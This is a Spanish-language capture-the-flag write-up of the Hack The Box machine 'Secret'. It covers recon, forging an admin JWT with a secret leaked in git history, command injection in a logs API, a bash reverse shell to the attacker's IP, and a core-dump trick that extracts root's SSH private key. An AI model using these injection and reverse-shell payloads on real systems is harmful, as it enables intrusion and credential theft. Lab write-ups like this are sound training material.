

![](2022-06-29-12-59-40.png)

## Máquina SECRET HTB

- #Author: José Luis Íñigo
- #Nickname: Riskoo
- #Machine Secret Hack the box
- Code Analysis Abusing an API Json Web Tokens (JWT) Abusing/Leveraging Core Dump [Privilege Escalation]
- style eWPT eWPTXv2 OSWE

### Comprobamos que estamos conectados a la máquina de hack the box

![](2022-06-28-19-26-29.png)

Se trata de una máquina linux . Las máquinas linux sulen estar en 64 y las windows en 128

### Exploramos los puertos abiertos en la máquina desde el exterior

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.120 -oG allports
```

Los puertos abiertos son 22,80,3000

### Inspeccionamos los puertos para ver que servicios corren en ellos y si son vulnerables a alguno de los script de nmap

```bash
nmap -sCV -p22,80,3000 10.10.11.120 -oN Targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 19:32 CEST
Nmap scan report for 10.10.11.120
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.20 seconds

```
Los puertos son ssh, web y un servidor node.js

En el puerto 3000 tenemos un dumdocs que es un tipo docusaurios para blog con markdown en node.js

### Hacemos un whatweb para ver las tecnologías que usa la web

```bash
whatweb 10.10.11.120:3000
http://10.10.11.120:3000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.11.120], Lightbox, Meta-Author[Xiaoying Riley at 3rd Wave Media], Script, Title[DUMB Docs], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```
Recorremos la web, ssh lo dejamos de momento porque normalmente se utiliza para luego poder entrar y escalar privilegios.

El puerto 80 y 5000 nos da la misma web nos da la misma web ... 

A simple vista vemos un register user pero vamos a ver que tal un fuzzin para ver las rutas, si vemos mucho pues nos centramos inicialmente en register y login.

En principio solo vemos 
```bash
nmap --script http-enum -p80 10.10.11.120 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 19:39 CEST
Nmap scan report for 10.10.11.120
Host is up (0.048s latency).    
PORT   STATE SERVICE                                                                                                                                                
80/tcp open  http                                                                                                                                                    http-enum:                                                                                                                                             
|_  /docs/: Potentially interesting folder                                                                                                                                                  
Nmap done: 1 IP address (1 host up) scanned in 119.15 seconds

```

Voy a usar ferox que es un fuzzing para ver diferentes carpetas. Veo muchas urls por lo que voy a hacer inicialmente un reconocimiento en register y login

```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.120:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      265l      668w    12872c http://10.10.11.120/
301      GET       10l       16w      183c http://10.10.11.120/download => /download/
200      GET        1l       12w       93c http://10.10.11.120/api
301      GET       10l       16w      179c http://10.10.11.120/assets => /assets/
200      GET      486l     1119w    20720c http://10.10.11.120/docs
301      GET       10l       16w      193c http://10.10.11.120/assets/images => /assets/images/
301      GET       10l       16w      185c http://10.10.11.120/assets/js => /assets/js/
301      GET       10l       16w      195c http://10.10.11.120/assets/plugins => /assets/plugins/
301      GET       10l       16w      187c http://10.10.11.120/assets/css => /assets/css/
200      GET        1l       12w       93c http://10.10.11.120/API
301      GET       10l       16w      213c http://10.10.11.120/assets/plugins/lightbox => /assets/plugins/lightbox/
301      GET       10l       16w      211c http://10.10.11.120/assets/images/features => /assets/images/features/
200      GET      486l     1119w    20720c http://10.10.11.120/Docs
301      GET       10l       16w      231c http://10.10.11.120/assets/plugins/lightbox/examples => /assets/plugins/lightbox/examples/
301      GET       10l       16w      223c http://10.10.11.120/assets/plugins/lightbox/dist => /assets/plugins/lightbox/dist/

```

Posiblemente luego hagamos un fuzzing si no vemos nada.

Explorando la web veo que se puede descargar uno el código por lo que nos lo descargamos con wget

![](2022-06-28-21-56-08.png)

>Entiendo que el motivo por el que se considera una web fácil en principio es que desde el login y register te viene casi un manual, voy a investigar esto antes que el código.

El motivo de explorar estas opciones es por probar lo que ponen y además el código pesa bastante por lo cual creo que va a traer demasiada información a priori.

Intento ver que pasa si directamente pongo
```bash
/api/user/login
o 
/api/user/register
```

Realmente el registro me está diciendo que tiene que ser por post y hay que enviarle un json

Capturamos con burpsuite /api/user/register

Cambiamos la petición a PoST y ponemos localhost y enviamos, aparece que nos falta name

![](2022-06-28-19-59-55.png)

Nos pone un ejemplo que luego intentaremos loguearnos porque seguramente este funcionará

```bash

  {
	"name": "dasith",
	"email": "root@dasith.works",
	"password": "Kekc8swFgD6zU"
  }

```

Le añadimos un json con nuestras credenciales, pero primero vamos a ver si el root funciona y nos quitamos de problemas

```bash
curl -X POST -H "Content-Type: application/json" 
 -d '{"email": "root@dasith.works","password": "Kekc8swFgD6zU"}' 
 http://10.10.11.120:3000/api/user/login
 ```
 
 Al no funcionar vamos a registrarnos 

```
 curl -X POST -H "Content-Type: application/json" -d '{"name": "pepito","email": "pepito@pepito.es","password": "pepito"}' http://10.10.11.120:3000/api/user/register
{"user":"pepito"}%  
```
Ahora nos logueamos

```bash
curl -X POST -H "Content-Type: application/json" 
 -d '{"email": "pepito@dpepito.es","password": "pepito"}' 
 http://10.10.11.120:3000/api/user/login
 
```

Nos devuelve un jwt el cual no hemos visto que se pida en ninguna parte, vamos a intentar cambiar los valores

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmJiNDg2NjcwYjNkZTA0NjBlMTI5ZDgiLCJuYW1lIjoicGVwaXRvIiwiZW1haWwiOiJwZXBpdG9AcGVwaXRvLmVzIiwiaWF0IjoxNjU2NDQyNjczfQ.Otks_fVahBvM6qlhwHMTpaAbpWSorNyS41hD7wIk1_c%  
```

Mandamos una peticion post con curl con la autorizacion del jwt

```bash
curl -s 'http://10.10.11.120/api/priv' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmJiNDg2NjcwYjNkZTA0NjBlMTI5ZDgiLCJuYW1lIjoicGVwaXRvIiwiZW1haWwiOiJwZXBpdG9AcGVwaXRvLmVzIiwiaWF0IjoxNjU2NDQyNjczfQ.Otks_fVahBvM6qlhwHMTpaAbpWSorNyS41hD7wIk1_c"

# Nos devuelve
{"role":{"role":"you are normal user","desc":"pepito"}}

```

Lo ideal sería poder loguearnos como el administrador o cambiar el rol de pepito pero nos falta la clave secreta... Aún así es posible que pudiésemos piratearlo con el confusing o algo parecido podríamos probar con dos usuarios y su token.

![](2022-06-28-21-50-05.png)

Vimos que el administrador es 
```json
"name": "theadmin",
	"email": "root@dasith.works",
	"password": "Kekc8swFgD6zU"
```
Voy a intentar hacer un ataque de confusión. Para ello necesito otro token por lo que voy a registrar otro usuario.

```bash
❯ curl -X POST -H "Content-Type: application/json" -d '{"name": "pepito2","email": "pepit2o@pepito.es","password": "pepito2"}' http://10.10.11.120:3000/api/user/register
{"user":"pepito2"}%  

  curl -X POST -H "Content-Type: application/json" -d '{"email": "pepit2o@pepito.es","password": "pepito2"}' http://10.10.11.120:3000/api/user/login

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmJiNjRhMzcwYjNkZTA0NjBlMTI5ZTAiLCJuYW1lIjoicGVwaXRvMiIsImVtYWlsIjoicGVwaXQyb0BwZXBpdG8uZXMiLCJpYXQiOjE2NTY0NDgyNTR9.bxUClMgtmQz7zZhgCyxf_Te69-XF5gFGxzAkYF3zdVw
```
Ahora tenemos dos tokens y es posible que podamos usar el ataque de confusión.

```bash
# Posiblemente tenga que encender docker
docker run --rm -it portswigger/sig2n <token1> <token2>
```


```bash
docker run --rm -it portswigger/sig2n eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmJiNDg2NjcwYjNkZTA0NjBlMTI5ZDgiLCJuYW1lIjoicGVwaXRvIiwiZW1haWwiOiJwZXBpdG9AcGVwaXRvLmVzIiwiaWF0IjoxNjU2NDQyNjczfQ.Otks_fVahBvM6qlhwHMTpaAbpWSorNyS41hD7wIk1_c eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmJiNjRhMzcwYjNkZTA0NjBlMTI5ZTAiLCJuYW1lIjoicGVwaXRvMiIsImVtYWlsIjoicGVwaXQyb0BwZXBpdG8uZXMiLCJpYXQiOjE2NTY0NDgyNTR9.bxUClMgtmQz7zZhgCyxf_Te69-XF5gFGxzAkYF3zdVw

  File "jwt_forgery.py", line 59, in <module>
    raise Exception("Not RSA signed tokens!")
```
Por lo que no funciona. Una vez llegado a este punto voy a revisar por encima el código que nos descargamos antes.

Lo primero que puedo ver es que hay un github. Por experiencia puede haber cosas interesantes.

Una vez descomprimida la carpeta entramos y hacemos un git log. Vamos a inspeccionar los archivos con git show

```bash
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```
Voy a probar en jwt.io con este secreto cambiarme el nombre. No se si es alguno de los dos voy a ver

![](2022-06-28-22-49-34.png)

Ahora sustituimos por los valores funciona poniendo el secreto que eliminaron , el primer token

![](2022-06-28-22-53-13.png)

Ahora lo enviamos y vemos si funciona.

![](2022-06-28-22-53-48.png)

Ya somos admin pero solo nos está devolviendo un token con nuestros datos, nada más. De momento no podemos hacer nada, voy a mirar el código por encima del proyecto


![](2022-06-28-22-56-16.png)

Voy a ver que pasa si envío log con un parámetro

![](2022-06-28-23-00-02.png)

La idea es que dentro de esta línea ver si ejecuta algo. Tendríamos que cerrar el log git con un ; y llamar a lo que queremos.
```bash
`git log --oneline ${file}`;
```

Siempre con el token que obtuvimos antes , cambiamos la url GET http://localhost:3000/api/logs?file=;ping+-c+1+127.0.0.1 

![](2022-06-28-23-08-00.png)

Vemos que efectivamente conseguimos que nos haga un ping

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'" | base64

YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYxJwo=

nc -nlvp 443

 ⚠️ Because + represents an encoded space, to insert a literal + character,
you should encode this as %2b.

;YmFzaCAtYyAnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYxJwo=
```
![](2022-06-28-23-20-28.png)

Hemos visto que funciona, vamos a hacer la misma petición desde curl escuchando por icmp
Con sudo tcpdump -ni tun0 icmp parece que vemos desde la propia consola que lanzamos el curl.

```bash

sudo tcpdump -ni tun0 icmp

curl -s 'http://10.10.11.120/api/logs?file=;ping+-c+1+10.10.14.9' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJf[spoiler]]yNjczfQ.g933JnjdcSRXs2AbDjrkUOsgDjPMjQDL3-MMvMTVMCs" | jq -r 

![](2022-06-29-09-02-52.png)


Hacemos una pequeña comprobación con /dev/null;id que sabemos que debe de funcionar.
```bash
curl -s -G 'http://10.10.11.120/api/logs' --data-urlencode 'file=/dev/null;id' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2[spoiler]]NjU2NDQyNjczfQ.g933JnjdcSRXs2AbDjrkUOsgDjPMjQDL3-MMvMTVMCs" | jq -r
```

![](2022-06-29-09-10-30.png)

Una vez que vemos que funciona vamos a probar por netcat para poder interactuar. 

```bash
# vamos a usar la siguiente revert shell bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1

curl -s -G 'http://10.10.11.120/api/logs' --data-urlencode "file=>/dev/null;bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ey[spoiler]]iwiaWF0IjoxNjU2NDQyNjczfQ.g933JnjdcSRXs2AbDjrkUOsgDjPMjQDL3-MMvMTVMCs" | jq -r
```
![](2022-06-29-09-18-32.png)

Ahora que tenemos la bash creo, voy a arreglarla

Si ponemos tty miramos si estamos dentro. Si no hacemos estas cosas cuando hagamos control+c se nos va fuera, ademas que nos gustaría tener cierto dominio la bash

```bash
script /dev/null -c bash

#Con control+z dejamos de escuchar el puerto

#posteriormente hacemos un

stty raw -echo; fg

# Con esto hemos conseguido reiniciar la configuración de la terminal en bash
reset xterm

#control l para limpiar no funciona pero porque puede valer diferente a xterm
export TERM=xterm

#miramos cuando vale la variable shell y hacemos que valga una bash

export SHELL=/bin/bash

#ver el número de columnas y filas
stty size

#poner el número de filas y columnas  como en mi pc 61 236
stty rows 61 columns 236

```
![](2022-06-29-13-03-34.png)

Entramos en la home de dasith y vemos la flag 

## Una vez dentro

Una vez dentro me gustaría poder entrar por ssh por lo que miro si tiene una id_rsa

```bash
.ssh/id_rsa
```
Vemos que no, voy a ver ahora que estamos dentro que puertos tiene abiertos
```bash
netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:27017         127.0.0.1:57640         ESTABLISHED
tcp        0    150 10.10.11.120:48330      10.10.14.9:443          ESTABLISHED
tcp        0      1 10.10.11.120:57090      1.1.1.1:53              SYN_SENT   
tcp        0      0 127.0.0.1:57640         127.0.0.1:27017         ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::3000                 :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
```

Estamos en lo que sería fase de reconocimiento a ver que encontramos, lo ideal sería conseguir alguna clave , ver que proceos hay abiertos etc para convertirnos en root

Vamos a ver los puertos abiertos de otra forma con cat/proc/net/tcp

Como tenemos la kitty podemos seleccionar la columand e los puertos control+alt y seleccionar los campos

![](2022-06-29-09-47-41.png)


Y ahora vamos a usar un script que tengo creado para mostrar este tipo de puertos

```bash
echo "00035
0016
6989
0050
DF48
6989
BCCA
E128" | while read port; do echo "[+] Puerto $port - > $(echo "obase10; ibase=16; $port" | bc)";done


[+] Puerto 00035 - > 53
[+] Puerto 0016 - > 22
[+] Puerto 6989 - > 27017
[+] Puerto 0050 - > 80
[+] Puerto DF48 - > 57160
[+] Puerto 6989 - > 27017
[+] Puerto BCCA - > 48330
[+] Puerto E128 - > 57640

```
Vamos a ver /opt
```bash
cd /opt
ls -l
```
![](2022-06-29-09-56-19.png)

Vale , vemos que todo es propiedad de root pero podemos leer code.c y valgrind.log y además ejecutar el tal count. Voy a ver que tienen.

Después de probar varios intentos de ejecutar count pdoemos ejecutarlo como script
```bash
./count 
Enter source file/directory name: code.c

Total characters = 3736
Total words      = 1271
Total lines      = 145
Save results a file? [y/N]: y
Path: /etc/passwd
Could not open /etc/passwd for writing

```
Al parecer nos cuenta los caracteres , las palabras y lineas y luego podemos guardar en algun sitio, voy a probar en home pero hay que abrir un archivo y escribir.. 

Vamos a ver la carpeta root ya que si ponemos una carpeta en vez de un archivo, nos lo lista. posteriormente vamos a intentar leer algo

```bash
dasith@secret:~$ /opt/./count
Enter source file/directory name: /root
-rw-r--r--  .viminfo
drwxr-xr-x  ..
-rw-r--r--  .bashrc
drwxr-xr-x  .local
drwxr-xr-x  snap
lrwxrwxrwx  .bash_history
drwx------  .config
drwxr-xr-x  .pm2
-rw-r--r--  .profile
drwxr-xr-x  .vim
drwx------  .
drwx------  .cache
-r--------  root.txt
drwxr-xr-x  .npm
drwx------  .ssh

Total entries       = 15
Regular files       = 4
Directories         = 10
Symbolic links      = 1
Save results a file? [y/N]: n
dasith@secret:~$ cat /root/.profile
cat: /root/.profile: Permission denied
dasith@secret:~$ cat /root/root.txt
cat: /root/root.txt: Permission denied

```

Vemos root.txt pero no podemos leerlo, obviamente count si puede leerlo

```bash
dasith@secret:~$ /opt/./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: 
```

Examinando el code.c que entiendo que es el código de count, vemos algunas cositas, como por ejemplo :
- En comentario está el que quita los permisos
- Que nunca cierra file
- que usa pr_set_dumpable buscando en google modifica las capabilities. Esto se ejecuta justo antes de pedirte el archivo por lo que nos da tiempo a ver los procesos que están abiertos y usando en ese momento count.

Hacemos justo cuando llegue un control+z para dejar en segundo plano y ver los procesos con ps -s | grep count

![](2022-06-29-10-56-05.png)

Vamos a probar ahora para ver los pid con 
```bash
ps auxww | grep count

root         855  0.0  0.1 235676  7472 ?        Ssl  Jun28   0:01 /usr/lib/accountsservice/accounts-daemon
dasith      2286  0.0  0.0   2488   592 pts/0    S+   08:40   0:00 /opt/./count
dasith      2323  0.0  0.0   2488   584 pts/1    T    08:54   0:00 ./count
dasith      2330  0.0  0.0   6432   736 pts/1    S+   09:00   0:00 grep --color=auto count

ls -l /proc/2323/fd
total 0
lrwx------ 1 dasith dasith 64 Jun 29 09:03 0 -> /dev/pts/1
lrwx------ 1 dasith dasith 64 Jun 29 09:03 1 -> /dev/pts/1
lrwx------ 1 dasith dasith 64 Jun 29 09:03 2 -> /dev/pts/1
lr-x------ 1 dasith dasith 64 Jun 29 09:03 3 -> /root/root.txt
dasith@secret:/proc/2323/fd$ cat 3
cat: 3: Permission denied

```

No nos deja leer... en la carpeta /root vimos un .profile... vamos a ver si de aquí si nos dejase leer

```bash
dasith@secret:/opt$ ps auxww | grep ./count
dasith      2286  0.0  0.0   2488   592 pts/0    S+   08:40   0:00 /opt/./count
dasith      2323  0.0  0.0   2488   584 pts/1    T    08:54   0:00 ./count
dasith      2380  0.0  0.0   2488   528 pts/1    T    09:06   0:00 ./count
dasith      2413  0.0  0.0   6432   740 pts/1    S+   09:06   0:00 grep --color=auto ./count
dasith@secret:/opt$ cat /proc/2323/fd/3
cat: /proc/2323/fd/3: Permission denied
dasith@secret:/opt$ head /proc/2323/fd/3
head: cannot open '/proc/2323/fd/3' for reading: Permission denied
dasith@secret:/opt$ head /proc/2386/fd/3
head: cannot open '/proc/2386/fd/3' for reading: No such file or directory
dasith@secret:/opt$ head /proc/2380/fd/3
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n 2> /dev/null || true

```

Vemos que ejecuta algo pero... .viminfo también se podía leer así que vamos a probar ahora con ese

![](2022-06-29-11-13-33.png)

Estupendo , haciendole un head he visto utf8 por lo que puede que haya algo dentro y ahora lo que veo es una clave ssh o varias...

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
        NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3
        KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+
        7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1
        xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx
        8G+Kb[spoiler]]xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k
        fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==
        -----END OPENSSH PRIVATE KEY-----
```

La idea ahora es conectarnos por ssh. ¿Cómo lo hacemos teniendo la clave privada? Guardamos la clave en un archivo , por ejemplo id_rsa.pub en el directorio del usuario y luego:

```bash
ssh -i /home/dasith/id_rsa.pub root@10.10.11.120
```

Lamentablemente aunque parece que si funciona, parece que hay alguien conectado o por lo menos el proceso está abierto y nos aparece
```bash

#Este error que aparece ahora se soluciona dándole permiso 600  la clave rsa
#chmod 600 id_rsa.pub
#por otra parte no se conectaría porque está en uso
dasith@secret:~$ ssh -i /home/dasith/id_rsa.pub root@10.10.11.120
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/dasith/id_rsa.pub' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "/home/dasith/id_rsa.pub": bad permissions
```
Hay que buscar una forma de cerrar el proceso. Mirando el code.c aparece un comentario  **// Enable coredump generation**. Esa es una buena pista para intentar generar un bloqueo del proceso. Cuando un programa se bloquea, el sistema almacena los archivos de volcado de bloqueo en **/var/crash**

![](2022-06-29-11-35-19.png)

Voy a mirar pero no aparece nada. Voy a intentar abrir el archivo id_rsa con count 


Pues bien cuando hago control+z para pausar y hago un ps para ver los procesos veo un monton ... es por los intentos realizados por mi, por lo que voy a empezar a matar procesos, para y de forma recursiva tenemos

1. abrir el count para que seamos digamos root
2. ponemos la path del archivo, ahora mismo da igual
3. control+z
4. ps para ver los procesos y luego kill -SIGSEGV numero_proceso_count
5. luego le damos a fg y volvemos y vemos que el proceso se mata.

Esto lo haremos hasta que en ps no quede ninguno

Una vez que no tenemos ninguno ya si podemos hacer lo que queremos

1. abrir count
2. poner /root/.ssh/id_rsa
3. control+z
4. vemos los procesos y matamos el de count con kill -SIGSEGV numero
5. fg
6. Nos ha aparecido como que falla el proceso , perfecto
7. Ahora vamos a /var/crash y le hacemos ls -l
8. Vemos que tenemos lo que es en realidad un comprimible con muchos datos llamados _opt_count.1000.crash

9. Lo descomprimimos y enviamos a una carpeta temporal /tmp/0xdf
```bash
apport-unpack _opt_count.1000.crash /tmp/0xdf
```
10. Revisamos los archivos , en este caso CoreDump parece que es el bueno puesto que aparece un base64 un montón de código, así que lo vamos a ver como strings

```bash
strings -n 30 /tmp/0xdf/CoreDump
```
Dentro ya vemos una clave privada que creo que además es la misma que antes.. pero bueno me la copio .

ya en mi pc creo id_rsa y pego la clave

le doy permiso 600 sino no funciona

```bash
chmod 600 id_rsa
```
Nos conectamos por ssh

```bash
ssh root@10.10.11.120 -i id_rsa
```

![](2022-06-29-12-56-51.png)